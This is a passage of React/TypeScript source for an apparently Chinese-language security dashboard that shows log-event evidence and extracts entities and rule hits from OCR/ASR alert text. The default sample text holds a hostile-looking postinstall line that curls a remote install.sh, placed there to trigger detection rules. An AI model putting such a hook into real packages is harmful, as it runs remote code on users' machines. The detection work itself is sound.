function LogEvidenceBlock({ text, title = '关键证据' }: { text: string; title?: string }) {
  const formattedText = formatLogEvidence(text)

  async function copyEvidence() {
    try {
      await navigator.clipboard.writeText(formattedText)
      toast.success('日志内容已复制')
    } catch {
      toast.error('复制失败，请手动选择内容')
    }
  }

  return (
    <div className='min-w-0 overflow-hidden rounded-md border border-border bg-[color:var(--surface-inset)]'>
      <div className='flex items-center justify-between gap-3 border-b border-border bg-[color:var(--surface-card)] px-3 py-2'>
        <div className='text-xs font-semibold text-foreground'>{title}</div>
        <Button
          type='button'
          variant='ghost'
          size='sm'
          className='h-7 px-2 text-muted-foreground hover:bg-[color:var(--surface-hover)] hover:text-foreground'
          onClick={() => void copyEvidence()}
        >
          <Copy className='size-3.5' />
          复制
        </Button>
      </div>
      <pre
        className='max-h-[330px] min-w-0 overflow-auto whitespace-pre-wrap break-words bg-[color:var(--surface-inset)] px-4 py-3 font-mono text-xs font-medium leading-6 text-foreground selection:bg-cyan-200/70 selection:text-slate-950 dark:selection:bg-cyan-700/70 dark:selection:text-white [overflow-wrap:anywhere] [scrollbar-width:thin]'
        title={formattedText}
      >
        {formattedText}
      </pre>
    </div>
  )
}

function LogEventDetailWorkbench({
  log,
  totalCount,
  runtimeSeverity,
  ignoreBusy,
  onIgnore,
}: {
  log?: DisplayedLogEvent
  totalCount: number
  runtimeSeverity: (log: DisplayedLogEvent) => SecuritySeverity
  ignoreBusy: boolean
  onIgnore: (log: DisplayedLogEvent) => void
}) {
  if (!log) {
    return (
      <Card className='flex h-[620px] min-w-0 flex-col overflow-hidden rounded-md border-border bg-[color:var(--surface-card)] shadow-none' style={{ boxShadow: 'none' }}>
        <CardHeader className='border-b border-border pb-3'>
          <CardTitle className='min-w-0 truncate text-base text-foreground'>当前事件详情</CardTitle>
        </CardHeader>
        <CardContent className='min-w-0 flex-1 overflow-y-auto overscroll-contain pr-1 [scrollbar-gutter:stable] [scrollbar-width:thin]'>
          <div className='rounded-md border border-slate-400/10 bg-[color:var(--surface-inset)] p-6 text-center text-sm text-muted-foreground'>
            {totalCount ? '选择左侧事件查看日志证据。' : '当前筛选下无风险事件。'}
          </div>
        </CardContent>
      </Card>
    )
  }

  const severity = runtimeSeverity(log)
  return (
    <Card className='flex h-[620px] min-w-0 flex-col overflow-hidden rounded-md border-border bg-[color:var(--surface-card)] shadow-none' style={{ boxShadow: 'none' }}>
      <CardHeader className='border-b border-border pb-3'>
        <CardTitle className='min-w-0 truncate text-base text-foreground' title={log.event}>
          {log.event}
        </CardTitle>
        <div className='mt-1 truncate font-mono text-xs text-muted-foreground' title={log.rule_id || log.id}>
          {log.rule_id || log.id || '规则待确认'}
        </div>
      </CardHeader>
      <Tabs defaultValue='overview' className='flex min-h-0 flex-1 flex-col'>
        <TabsList className='mx-4 mt-3 grid h-9 grid-cols-4 rounded-md'>
          <TabsTrigger value='overview'>概览</TabsTrigger>
          <TabsTrigger value='evidence'>证据</TabsTrigger>
          <TabsTrigger value='raw'>原始记录</TabsTrigger>
          <TabsTrigger value='action'>处置</TabsTrigger>
        </TabsList>
        <div className='min-h-0 flex-1 overflow-y-auto overscroll-contain px-4 pb-4 [scrollbar-gutter:stable] [scrollbar-width:thin]'>
          <TabsContent value='overview' className='mt-3 space-y-3'>
            <div className='flex flex-wrap gap-2'>
              <SeverityPill severity={severity} />
              <span className='rounded-full border border-orange-300/30 bg-orange-400/10 px-2 py-0.5 text-xs font-medium text-orange-700 dark:text-orange-200'>
                {log.signal}
              </span>
              <span className='rounded-full border border-cyan-300/30 bg-cyan-400/10 px-2 py-0.5 text-xs font-medium text-cyan-700 dark:text-cyan-200'>
                置信度 {logConfidencePercent(log)}%
              </span>
            </div>
            <div className='grid gap-2 text-sm'>
              <DetailRow label='日志来源' value={log.source || '-'} />
              <DetailRow label='异常时间' value={log.time || '-'} />
              <DetailRow label='源端' value={logSourceEndpoint(log)} />
              <DetailRow label='目标端' value={logTargetEndpoint(log)} />
              <DetailRow label='命中次数' value={String(log.count ?? log.occurrences ?? 1)} />
              <DetailRow label='事件评分' value={log.score != null ? `${log.score}/100` : '-'} />
            </div>
          </TabsContent>
          <TabsContent value='evidence' className='mt-3 space-y-3'>
            <LogEvidenceBlock text={log.evidence || '未提供证据片段'} />
          </TabsContent>
          <TabsContent value='raw' className='mt-3 space-y-3'>
            <div className='text-xs leading-5 text-muted-foreground'>优先展示检测结果携带的原始 JSON；缺失时展示规范化事件记录。</div>
            <LogEvidenceBlock title='原始或结构化记录' text={logStructuredRecord(log)} />
          </TabsContent>
          <TabsContent value='action' className='mt-3 space-y-3'>
            <CicdInfoBlock title='建议处理' text={logRecommendationText(log)} tone='action' />
            <div className='rounded-md border border-border bg-[color:var(--surface-inset)] p-3'>
              <div className='text-sm font-semibold text-foreground'>复核顺序</div>
              <ol className='mt-2 space-y-2 text-xs leading-5 text-muted-foreground'>
                <li>1. 核对来源、账号和异常时间窗口。</li>
                <li>2. 关联部署记录、依赖风险与目标资产。</li>
                <li>3. 确认误报后再加入基线或忽略规则。</li>
              </ol>
            </div>
            {log.fingerprint || log.dedupe_key ? (
              <Button type='button' variant='outline' className='w-full' disabled={ignoreBusy} onClick={() => onIgnore(log)}>
                {ignoreBusy ? <Loader2 className='size-4 animate-spin' /> : <EyeOff className='size-4' />}
                标记为误报
              </Button>
            ) : null}
          </TabsContent>
        </div>
      </Tabs>
    </Card>
  )
}

function _MultimodalEvidencePanel_OLD({
  result,
  workspaceId,
  onScanned,
}: {
  result?: MultimodalAuditResult | null
  workspaceId?: string
  onScanned: (result: MultimodalAuditResult) => void | Promise<void>
}) {
  const [selectedFiles, setSelectedFiles] = useState<File[]>([])
  const [uploading, setUploading] = useState(false)
  const [refreshingLatest, setRefreshingLatest] = useState(false)
  const [recognizedText, setRecognizedText] = useState(
    'npm install @acme/payments-helper@9.9.2\npostinstall: curl http://185.199.108.153/install.sh\n凌晨三点 checkout-api 出现异常外联，admin/export 接口访问量突然升高。'
  )
  const [textSourceType, setTextSourceType] = useState<MultimodalSourceType>('image')
  const [analyzingText, setAnalyzingText] = useState(false)
  const [ruleDetailsOpen, setRuleDetailsOpen] = useState(false)
  const [textDetailsOpen, setTextDetailsOpen] = useState(false)
  const [sourceDetailsOpen, setSourceDetailsOpen] = useState(false)
  const ruleDetailsRef = useRef<HTMLDivElement>(null)
  const textDetailsRef = useRef<HTMLDivElement>(null)
  const sourceDetailsRef = useRef<HTMLDivElement>(null)
  const reducedMotion = useReducedMotion()
  const evidence = result?.evidence ?? []
  const summary = result?.summary
  const warnings = result?.warnings ?? []
  const textRecognitions = evidence.flatMap((item) =>
    (item.recognitions ?? []).map((recognition) => ({
      ...recognition,
      evidence_id: item.evidence_id,
      source_name: item.original_filename,
      }))
  )
  const entityRows = evidence.flatMap((item) =>
    (item.entities ?? []).map((entity) => ({
      ...entity,
      evidence_id: item.evidence_id,
      source_name: item.original_filename,
      source_type: item.source_type,
    }))
  )
  const findingRows = evidence.flatMap((item) =>
    (item.findings ?? []).map((finding) => ({
      ...finding,
      source_name: item.original_filename,
      source_type: item.source_type,
    }))
  )
  const entitySummaries = aggregateMultimodalEntities(entityRows, findingRows)
  const topEntities = entitySummaries.slice(0, 4)
  const entityGroups = multimodalEntityGroups(entitySummaries)
  const [expandedEntityKey, setExpandedEntityKey] = useState<string | null>(entitySummaries[0]?.key ?? null)
  useEffect(() => {
    if (!entitySummaries.length) {
      if (expandedEntityKey) setExpandedEntityKey(null)
      return
    }
    if (!expandedEntityKey || !entitySummaries.some((entity) => entity.key === expandedEntityKey)) {
      setExpandedEntityKey(entitySummaries[0].key)
    }
  }, [entitySummaries, expandedEntityKey])
  useEffect(() => {
    const target =
      sourceDetailsOpen
        ? sourceDetailsRef.current
        : textDetailsOpen
          ? textDetailsRef.current
          : ruleDetailsOpen
            ? ruleDetailsRef.current
            : null
    if (!target) return
    const timeoutId = window.setTimeout(() => {
      target.scrollIntoView({
        behavior: reducedMotion ? 'auto' : 'smooth',
        block: 'nearest',
      })
    }, 80)
    return () => window.clearTimeout(timeoutId)
  }, [ruleDetailsOpen, textDetailsOpen, sourceDetailsOpen, reducedMotion])
  const derivedArtifacts = evidence.flatMap((item) =>
    (item.derived ?? []).map((artifact) => ({
      ...artifact,
      evidence_id: item.evidence_id,
      source_name: item.original_filename,
    }))
  )
  const evidenceSourceSummaries = evidence
    .map((item) => {
      const entityCount = entityRows.filter((entity) => entity.evidence_id === item.evidence_id).length
      const findingCount = findingRows.filter((finding) => finding.evidence_id === item.evidence_id).length
      const recognitionCount = textRecognitions.filter((recognition) => recognition.evidence_id === item.evidence_id).length
      return {
        item,
        entityCount,
        findingCount,
        recognitionCount,
        weight: findingCount * 100 + entityCount * 10 + recognitionCount,
      }
    })
    .sort((left, right) => right.weight - left.weight || Number(new Date(right.item.uploaded_at)) - Number(new Date(left.item.uploaded_at)))
  const highlightedEvidenceSources = evidenceSourceSummaries.filter((source) => source.weight > 0).slice(0, 4)
  const textEvidenceSummaries = textRecognitions
    .map((item) => {
      const entityCount = entityRows.filter((entity) => entity.evidence_id === item.evidence_id).length
      const findingCount = findingRows.filter((finding) => finding.evidence_id === item.evidence_id).length
      const confidence = item.confidence ?? 0
      return {
        item,
        entityCount,
        findingCount,
        confidence,
        weight: findingCount * 100 + entityCount * 10 + confidence,
      }
    })
    .sort((left, right) => right.weight - left.weight || right.confidence - left.confidence)
  const highlightedTextEvidence = textEvidenceSummaries.filter((item) => item.weight > 0).slice(0, 3)

  async function uploadEvidence() {
    if (!selectedFiles.length) {
      toast.error('请选择至少一个音频、截图或视频文件')
      return
    }
    setUploading(true)
    try {
      await onScanned(await runMultimodalEvidenceScan(selectedFiles, workspaceId))
      setSelectedFiles([])
    } catch (error) {
      toast.error(error instanceof Error ? error.message : '多模态证据上传失败')
    } finally {
      setUploading(false)
    }
  }

  async function refreshLatest() {
    setRefreshingLatest(true)
    try {
      const payload = await loadMultimodalEvidenceLatest(100, workspaceId)
      await onScanned(payload)
      toast.success(`已刷新 ${payload.summary.evidence_count} 条多模态证据`)
    } catch (error) {
      toast.error(error instanceof Error ? error.message : '多模态证据刷新失败')
    } finally {
      setRefreshingLatest(false)
    }
  }

  async function analyzeRecognizedText() {
    const text = recognizedText.trim()
    if (!text) {
      toast.error('请输入 ASR/OCR 识别文本')
      return
    }
    setAnalyzingText(true)
    try {
      const payload = await analyzeMultimodalRecognizedText({
        workspaceId,
        recognizedText: text,
        sourceType: textSourceType,
        evidenceType: textSourceType === 'audio' ? 'audio_asr' : 'visual_ocr',
        sourceName: textSourceType === 'audio' ? 'manual-asr-alert.txt' : 'manual-ocr-screenshot.txt',
        confidence: 0.92,
      })
      await onScanned(payload)
      toast.success(`研判完成，抽取 ${payload.summary.entity_count} 个实体，命中 ${payload.summary.finding_count} 条规则`)
    } catch (error) {
      toast.error(error instanceof Error ? error.message : '识别文本研判失败')
    } finally {
      setAnalyzingText(false)
    }
  }

  return (
    <div className={cn(moduleSplitGridClass, 'xl:grid-cols-[minmax(0,1fr)_420px]')}>
      <div className={moduleMainColumnClass}>
        <Card className={moduleCardClass}>
          <CardHeader>
            <div className='flex flex-wrap items-start justify-between gap-3'>
              <div>
                <CardTitle className='flex items-center gap-2 text-base'>
                  <Images className='size-4 text-cyan-600' />
                  外部告警证据
                </CardTitle>
              </div>
              <div className='flex flex-wrap items-center gap-2'>
                <Input
                  type='file'
                  multiple
                  accept='audio/*,image/*,video/*,.aac,.flac,.m4a,.mp3,.ogg,.opus,.wav,.png,.jpg,.jpeg,.webp,.gif,.mp4,.mov,.mkv,.webm,.avi'
                  className={cn('w-[320px] max-w-full', fileInputClass)}
                  onChange={(event) => setSelectedFiles(Array.from(event.target.files ?? []))}
                />
                <Button size='sm' variant='outline' onClick={() => void refreshLatest()} disabled={refreshingLatest}>
                  {refreshingLatest ? <Loader2 className='animate-spin' /> : <RefreshCw />}
                  刷新
                </Button>
                <Button size='sm' className={actionButtonClass} onClick={() => void uploadEvidence()} disabled={uploading || !selectedFiles.length}>
                  {uploading ? <Loader2 className='animate-spin' /> : <Upload />}
                  上传证据
                </Button>
              </div>
            </div>
          </CardHeader>
          <CardContent className='space-y-4'>
            <div className='grid gap-3 md:grid-cols-6'>
              <AuditMetric label='证据总数' value={summary?.evidence_count ?? 0} tone='cyan' />
              <AuditMetric label='音频' value={summary?.audio ?? 0} tone='emerald' />
              <AuditMetric label='截图/图像' value={summary?.image ?? 0} tone='orange' />
              <AuditMetric label='视频' value={summary?.video ?? 0} tone='red' />
              <AuditMetric label='安全实体' value={summary?.entity_count ?? 0} tone='slate' />
              <AuditMetric label='规则命中' value={summary?.finding_count ?? 0} tone='red' />
            </div>

            {!evidence.length ? (
              <Alert className='rounded-md'>
                <Images className='size-4' />
                <AlertTitle>等待多模态证据</AlertTitle>
                <AlertDescription>
                  上传后会生成 evidence_id、来源类型、文件路径、SHA256 摘要，并尝试输出 ASR/OCR 文本。
                </AlertDescription>
              </Alert>
            ) : null}

            {selectedFiles.length ? (
              <div className='flex flex-wrap gap-2'>
                {selectedFiles.map((file) => (
                  <Badge key={`${file.name}-${file.size}`} variant='outline' className='rounded-md'>
                    {file.name} · {formatBytes(file.size)}
                  </Badge>
                ))}
              </div>
            ) : null}
          </CardContent>
        </Card>

        <Card className={moduleCardClass}>
          <CardHeader>
            <div className='flex flex-wrap items-start justify-between gap-3'>
              <div>
                <CardTitle className='flex items-center gap-2 text-base'>
                  <Radar className='size-4 text-orange-600' />
                  安全实体抽取与规则研判
                </CardTitle>
              </div>
              <div className='flex items-center gap-2'>
                <Select value={textSourceType} onValueChange={(value) => setTextSourceType(value as MultimodalSourceType)}>
                  <SelectTrigger className='h-9 w-[120px] rounded-md'>
                    <SelectValue />
                  </SelectTrigger>
                  <SelectContent>
                    <SelectItem value='image'>截图 OCR</SelectItem>
                    <SelectItem value='audio'>音频 ASR</SelectItem>
                    <SelectItem value='video'>视频帧 OCR</SelectItem>
                  </SelectContent>
                </Select>
                <Button size='sm' onClick={() => void analyzeRecognizedText()} disabled={analyzingText || !recognizedText.trim()}>
                  {analyzingText ? <Loader2 className='animate-spin' /> : <Radar />}
                  研判文本
                </Button>
              </div>
            </div>
          </CardHeader>
          <CardContent className='space-y-3'>
            <Textarea
              value={recognizedText}
              onChange={(event) => setRecognizedText(event.target.value)}
              className='min-h-[150px] resize-y rounded-md font-mono text-sm leading-6'
              placeholder='粘贴 ASR/OCR recognized_text'
            />
            <div className='grid gap-3 sm:grid-cols-3'>
              <AuditMetric label='最高风险' value={summary?.risk_score ?? 0} tone={(summary?.risk_score ?? 0) >= 90 ? 'red' : 'orange'} />
              <AuditMetric label='严重命中' value={summary?.critical ?? 0} tone='red' />
              <AuditMetric label='文本证据' value={summary?.recognition_count ?? 0} tone='cyan' />
            </div>
          </CardContent>
        </Card>

        <Card className={moduleCardClass}>
          <CardHeader>
            <div className='flex flex-wrap items-start justify-between gap-3'>
              <div>
                <CardTitle className='flex items-center gap-2 text-base'>
                  <Fingerprint className='size-4 text-cyan-600' />
                  抽取实体
                </CardTitle>
              </div>
              <Badge variant='outline' className='rounded-md'>
                {entitySummaries.length} 个去重实体
              </Badge>
              <Badge variant='outline' className={cn('rounded-md', statusClasses.active)}>
                点击实体查看规则
              </Badge>
            </div>
          </CardHeader>
          <CardContent className='space-y-4'>
            {entitySummaries.length ? (
              <>
                <div className='grid gap-3 lg:grid-cols-4'>
                  {topEntities.map((entity) => (
                    <button
                      key={entity.key}
                      type='button'
                      onClick={() => setExpandedEntityKey(entity.key)}
                      className={cn(
                        'rounded-md border bg-muted/20 p-3 text-left transition hover:border-cyan-300 hover:bg-cyan-50/50 dark:hover:bg-cyan-950/20',
                        expandedEntityKey === entity.key && 'border-cyan-300 bg-cyan-50/60 dark:bg-cyan-950/25'
                      )}
                    >
                      <div className='mb-3 flex items-start justify-between gap-2'>
                        <Badge variant='outline' className={cn('rounded-md', entityBadgeClass(entity.type))}>
                          {entityTypeLabel(entity.type)}
                        </Badge>
                        <Badge variant='outline' className={cn('rounded-md', multimodalEntityPathClass(entity.group))}>
                          {multimodalEntityPathLabel(entity.group)}
                        </Badge>
                      </div>
                      <div className='min-w-0 truncate font-mono text-sm font-semibold' title={entity.value}>
                        {entity.value}
                      </div>
                      <div className='mt-2 flex flex-wrap gap-2 text-xs text-muted-foreground'>
                        <span>{entity.count} 次出现</span>
                        <span>{entity.sourceCount} 个来源</span>
                        <span>{entity.ruleCount ? `${entity.ruleCount} 条规则` : `${Math.round(entity.confidence * 100)}% 置信`}</span>
                      </div>
                    </button>
                  ))}
                </div>

                <div className='grid gap-2 sm:grid-cols-2 lg:grid-cols-6'>
                  {entityGroups.map((group) => (
                    <div key={group.id} className='rounded-md border bg-background px-3 py-2'>
                      <div className='text-xs text-muted-foreground'>{group.label}</div>
                      <div className='mt-1 text-lg font-semibold'>{group.count}</div>
                    </div>
                  ))}
                </div>

                <div className='overflow-hidden rounded-md border'>
                  <div className='grid grid-cols-[130px_minmax(0,1.1fr)_110px_120px_120px_minmax(0,1.2fr)] gap-3 border-b bg-muted/35 px-3 py-2 text-xs font-medium text-muted-foreground max-xl:hidden'>
                    <span>类型</span>
                    <span>实体</span>
                    <span>出现</span>
                    <span>命中规则</span>
                    <span>路径作用</span>
                    <span>代表证据</span>
                  </div>
                  <div className='divide-y'>
                    {entitySummaries.map((entity) => (
                      <div key={entity.key}>
                        <button
                          type='button'
                          onClick={() => setExpandedEntityKey(expandedEntityKey === entity.key ? null : entity.key)}
                          className={cn(
                            'grid w-full gap-3 px-3 py-3 text-left transition hover:bg-muted/35 xl:grid-cols-[130px_minmax(0,1.1fr)_110px_120px_120px_minmax(0,1.2fr)]',
                            expandedEntityKey === entity.key && 'bg-cyan-50/45 dark:bg-cyan-950/15'
                          )}
                        >
                          <div className='flex flex-wrap items-center gap-2'>
                            <Badge variant='outline' className={cn('rounded-md', entityBadgeClass(entity.type))}>
                              {entityTypeLabel(entity.type)}
                            </Badge>
                            <span className='text-xs text-muted-foreground xl:hidden'>
                              {entity.count} 次 · {entity.ruleCount} 条规则
                            </span>
                          </div>
                          <div className='min-w-0'>
                            <code className='block truncate rounded bg-muted px-2 py-1 text-xs' title={entity.value}>
                              {entity.value}
                            </code>
                            <div className='mt-1 truncate text-xs text-muted-foreground' title={entity.sourceNames.join('、')}>
                              来源：{entity.sourceNames.slice(0, 2).join('、')}
                              {entity.sourceNames.length > 2 ? ` 等 ${entity.sourceNames.length} 个` : ''}
                            </div>
                          </div>
                          <div className='hidden text-sm xl:block'>
                            <div>{entity.count} 次</div>
                            <div className='text-xs text-muted-foreground'>{entity.sourceCount} 个来源</div>
                          </div>
                          <div className='flex flex-wrap items-center gap-2'>
                            {entity.ruleCount ? (
                              <>
                                <Badge variant='outline' className={cn('rounded-md', entity.maxRuleSeverity ? severityClasses[entity.maxRuleSeverity] : statusClasses.observed)}>
                                  {entity.ruleCount} 条规则
                                </Badge>
                                <span className='text-xs text-muted-foreground'>最高 {entity.maxRuleScore}</span>
                              </>
                            ) : (
                              <Badge variant='outline' className={cn('rounded-md', statusClasses.observed)}>
                                未命中
                              </Badge>
                            )}
                          </div>
                          <div>
                            <Badge variant='outline' className={cn('rounded-md', multimodalEntityPathClass(entity.group))}>
                              {multimodalEntityPathLabel(entity.group)}
                            </Badge>
                          </div>
                          <div className='min-w-0 text-sm leading-6 text-muted-foreground'>
                            <div className='line-clamp-2' title={entity.examples[0] ?? ''}>
                              {entity.examples[0] ?? '暂无证据片段'}
                            </div>
                          </div>
                        </button>
                        {expandedEntityKey === entity.key ? (
                          <div className='border-t bg-muted/20 px-3 py-3'>
                            {entity.ruleSummaries.length ? (
                              <div className='grid gap-3 lg:grid-cols-2'>
                                {entity.ruleSummaries.map((rule) => (
                                  <div key={rule.key} className='rounded-md border bg-background p-3'>
                                    <div className='flex flex-wrap items-start justify-between gap-2'>
                                      <div className='min-w-0'>
                                        <div className='truncate font-medium' title={rule.title}>{rule.title}</div>
                                        <code className='mt-1 block truncate text-xs text-muted-foreground' title={rule.ruleId}>
                                          {rule.ruleId}
                                        </code>
                                      </div>
                                      <Badge variant='outline' className={cn('rounded-md', severityClasses[rule.severity] ?? severityClasses.medium)}>
                                        {severityLabels[rule.severity] ?? rule.severity} · {rule.score}
                                      </Badge>
                                    </div>
                                    <div className='mt-3 grid gap-2 text-sm md:grid-cols-3'>
                                      <div className='rounded-md bg-muted/40 px-3 py-2'>
                                        <div className='text-xs text-muted-foreground'>命中次数</div>
                                        <div className='font-semibold'>{rule.count}</div>
                                      </div>
                                      <div className='rounded-md bg-muted/40 px-3 py-2'>
                                        <div className='text-xs text-muted-foreground'>证据来源</div>
                                        <div className='font-semibold'>{rule.evidenceCount}</div>
                                      </div>
                                      <div className='rounded-md bg-muted/40 px-3 py-2'>
                                        <div className='text-xs text-muted-foreground'>关键词</div>
                                        <div className='truncate font-semibold' title={rule.keywords.join('、')}>
                                          {rule.keywords.slice(0, 3).join('、') || '-'}
                                        </div>
                                      </div>
                                    </div>
                                    <div className='mt-3 text-sm leading-6'>
                                      <span className='text-muted-foreground'>建议：</span>
                                      {rule.recommendation || '结合原始证据复核后再处置。'}
                                    </div>
                                    {rule.entities.length ? (
                                      <div className='mt-3 flex flex-wrap gap-1.5'>
                                        {rule.entities.slice(0, 8).map((value) => (
                                          <Badge key={`${rule.key}-${value}`} variant='outline' className='rounded-md'>
                                            {value}
                                          </Badge>
                                        ))}
                                      </div>
                                    ) : null}
                                  </div>
                                ))}
                              </div>
                            ) : (
                              <div className='rounded-md border border-dashed bg-background p-4 text-sm text-muted-foreground'>
                                这个实体目前只是线索，尚未命中具体规则。可以结合日志、SBOM 或 CI/CD 结果继续关联。
                              </div>
                            )}
                          </div>
                        ) : null}
                      </div>
                    ))}
                  </div>
                </div>

                <Collapsible>
                  <CollapsibleTrigger asChild>
                    <Button variant='outline' className='w-full justify-between rounded-md'>
                      查看原始抽取记录
                      <ChevronDown className='size-4' />
                    </Button>
                  </CollapsibleTrigger>
                  <CollapsibleContent className='mt-3 overflow-hidden rounded-md border'>
                    <Table>
                      <TableHeader>
                        <TableRow>
                          <TableHead>类型</TableHead>
                          <TableHead>值</TableHead>
                          <TableHead>来源</TableHead>
                          <TableHead>证据片段</TableHead>
                          <TableHead>置信度</TableHead>
                        </TableRow>
                      </TableHeader>
                      <TableBody>
                        {entityRows.map((entity) => (
                          <TableRow key={`${entity.evidence_id}-${entity.type}-${entity.normalized}-${entity.start}`}>
                            <TableCell>
                              <Badge variant='outline' className={cn('rounded-md', entityBadgeClass(entity.type))}>
                                {entityTypeLabel(entity.type)}
                              </Badge>
                            </TableCell>
                            <TableCell className='max-w-[220px]'>
                              <code className='block truncate rounded bg-muted px-2 py-1 text-xs' title={entity.value}>
                                {entity.value}
                              </code>
                            </TableCell>
                            <TableCell className='min-w-[180px]'>
                              <div className='max-w-[220px] truncate text-sm' title={entity.source_name}>
                                {entity.source_name}
                              </div>
                              <code className='mt-1 block truncate text-xs text-muted-foreground' title={entity.evidence_id}>
                                {entity.evidence_id}
                              </code>
                            </TableCell>
                            <TableCell className='max-w-[520px] text-sm leading-6 text-muted-foreground'>
                              <div className='line-clamp-2' title={entity.evidence}>
                                {entity.evidence}
                              </div>
                            </TableCell>
                            <TableCell className='whitespace-nowrap'>{Math.round((entity.confidence ?? 0) * 100)}%</TableCell>
                          </TableRow>
                        ))}
                      </TableBody>
                    </Table>
                  </CollapsibleContent>
                </Collapsible>
              </>
            ) : (
              <div className='rounded-md border border-dashed p-8 text-center text-sm text-muted-foreground'>
                暂无实体；上传文件或粘贴 ASR/OCR 文本后会在这里显示抽取结果。
              </div>
            )}
          </CardContent>
        </Card>

        <Card className={moduleCardClass}>
          <CardHeader>
            <div className='flex flex-wrap items-start justify-between gap-3'>
              <div>
                <CardTitle className='flex items-center gap-2 text-base'>
                  <ShieldAlert className='size-4 text-red-600' />
                  原始规则命中记录
                </CardTitle>
              </div>
              <Badge variant='outline' className='rounded-md'>
                {findingRows.length} 条原始命中
              </Badge>
            </div>
          </CardHeader>
          <CardContent>
            <Collapsible open={ruleDetailsOpen} onOpenChange={setRuleDetailsOpen}>
              <CollapsibleTrigger asChild>
                <Button
                  type='button'
                  variant='outline'
                  className='w-full justify-between rounded-md transition-[border-color,background-color,box-shadow,transform] duration-300 hover:-translate-y-0.5 hover:border-cyan-400/40 hover:shadow-md active:translate-y-0'
                  aria-expanded={ruleDetailsOpen}
                >
                  查看全部规则命中记录
                  <ChevronDown className={cn('size-4 transition-transform duration-300', ruleDetailsOpen && 'rotate-180')} />
                </Button>
              </CollapsibleTrigger>
              <CollapsibleContent className='mt-3 rounded-md border data-[state=closed]:animate-out data-[state=open]:animate-in data-[state=closed]:fade-out-0 data-[state=open]:fade-in-0 data-[state=closed]:slide-out-to-top-1 data-[state=open]:slide-in-from-top-1'>
                <div ref={ruleDetailsRef} className='max-h-[65vh] overflow-auto [scrollbar-gutter:stable]'>
                <Table>
                  <TableHeader>
                    <TableRow>
                      <TableHead>等级</TableHead>
                      <TableHead>规则</TableHead>
                      <TableHead>关联实体</TableHead>
                      <TableHead>关键词</TableHead>
                      <TableHead>建议</TableHead>
                    </TableRow>
                  </TableHeader>
                  <TableBody>
                    {findingRows.map((finding) => (
                      <TableRow key={`${finding.id}-${finding.rule_id}`}>
                        <TableCell>
                          <Badge variant='outline' className={cn('rounded-md', severityClasses[finding.severity] ?? severityClasses.medium)}>
                            {severityLabels[finding.severity] ?? finding.severity} · {finding.score}
                          </Badge>
                        </TableCell>
                        <TableCell className='min-w-[220px]'>
                          <div className='font-medium'>{finding.title}</div>
                          <code className='mt-1 block break-all text-xs text-muted-foreground'>{finding.rule_id}</code>
                        </TableCell>
                        <TableCell className='max-w-[320px]'>
                          <div className='flex flex-wrap gap-1.5'>
                            {(finding.entities ?? []).slice(0, 8).map((entity) => (
                              <Badge key={`${finding.id}-${entity.type}-${entity.value}`} variant='outline' className='rounded-md'>
                                {entity.value}
                              </Badge>
                            ))}
                          </div>
                        </TableCell>
                        <TableCell className='max-w-[220px] text-sm text-muted-foreground'>
                          {(finding.matched_keywords ?? []).join(', ') || '-'}
                        </TableCell>
                        <TableCell className='max-w-[420px] text-sm leading-6'>{finding.recommendation}</TableCell>
                      </TableRow>
                    ))}
                    {!findingRows.length ? (
                      <TableRow>
                        <TableCell colSpan={5} className='h-24 text-center text-sm text-muted-foreground'>
                          暂无规则命中；示例文本会触发安装脚本外联和敏感接口异常规则。
                        </TableCell>
                      </TableRow>
                    ) : null}
                  </TableBody>
                </Table>
                </div>
              </CollapsibleContent>
            </Collapsible>
          </CardContent>
        </Card>

        <Card className={moduleCardClass}>
          <CardHeader>
            <div className='flex flex-wrap items-start justify-between gap-3'>
              <div>
                <CardTitle className='flex items-center gap-2 text-base'>
                  <FileText className='size-4 text-cyan-600' />
                  识别文本追溯
                </CardTitle>
              </div>
              <Badge variant='outline' className='rounded-md'>
                {textRecognitions.length} 条识别文本
              </Badge>
            </div>
          </CardHeader>
          <CardContent className='space-y-4'>
            {textRecognitions.length ? (
              <>
                <div className='grid gap-3 sm:grid-cols-3'>
                  <AuditMetric label='识别文本' value={textRecognitions.length} tone='cyan' />
                  <AuditMetric label='关联规则' value={findingRows.length} tone='red' />
                  <AuditMetric
                    label='最高置信(%)'
                    value={Math.round(Math.max(...textRecognitions.map((item) => item.confidence ?? 0)) * 100)}
                    tone='emerald'
                  />
                </div>

                <div className='space-y-2'>
                  <div className='flex items-center justify-between gap-3'>
                    <div className='text-sm font-medium'>重点文本片段</div>
                  </div>
                  <div className='grid gap-3 lg:grid-cols-3'>
                    {(highlightedTextEvidence.length ? highlightedTextEvidence : textEvidenceSummaries.slice(0, 3)).map(({ item, entityCount, findingCount }) => (
                      <div key={`${item.evidence_id}-${item.evidence_type}-${item.source_path}-${item.recognized_text}`} className='rounded-md border bg-muted/15 p-3'>
                        <div className='flex flex-wrap items-start justify-between gap-3'>
                          <div className='min-w-0'>
                            <Badge variant='outline' className={cn('rounded-md', multimodalRecognitionClass(item.evidence_type))}>
                              {multimodalRecognitionLabel(item.evidence_type)}
                            </Badge>
                            <div className='mt-2 truncate font-medium' title={item.source_name}>
                              {item.source_name}
                            </div>
                          </div>
                          <div className='text-sm font-semibold'>{Math.round((item.confidence ?? 0) * 100)}%</div>
                        </div>
                        <div className='mt-3 line-clamp-4 whitespace-pre-wrap rounded-md bg-background px-3 py-2 text-sm leading-6 text-muted-foreground' title={item.recognized_text}>
                          {item.recognized_text}
                        </div>
                        <div className='mt-3 flex flex-wrap gap-2'>
                          <Badge variant='outline' className={cn('rounded-md', findingCount ? severityClasses.high : statusClasses.observed)}>
                            {findingCount} 条规则
                          </Badge>
                          <Badge variant='outline' className={cn('rounded-md', entityCount ? statusClasses.active : statusClasses.observed)}>
                            {entityCount} 个实体
                          </Badge>
                          <Badge variant='outline' className='rounded-md'>
                            {item.engine}
                          </Badge>
                        </div>
                      </div>
                    ))}
                  </div>
                </div>

                <Collapsible open={textDetailsOpen} onOpenChange={setTextDetailsOpen}>
                  <CollapsibleTrigger asChild>
                    <Button
                      type='button'
                      variant='outline'
                      className='w-full justify-between rounded-md transition-[border-color,background-color,box-shadow,transform] duration-300 hover:-translate-y-0.5 hover:border-cyan-400/40 hover:shadow-md active:translate-y-0'
                      aria-expanded={textDetailsOpen}
                    >
                      查看全部识别文本
                      <ChevronDown className={cn('size-4 transition-transform duration-300', textDetailsOpen && 'rotate-180')} />
                    </Button>
                  </CollapsibleTrigger>
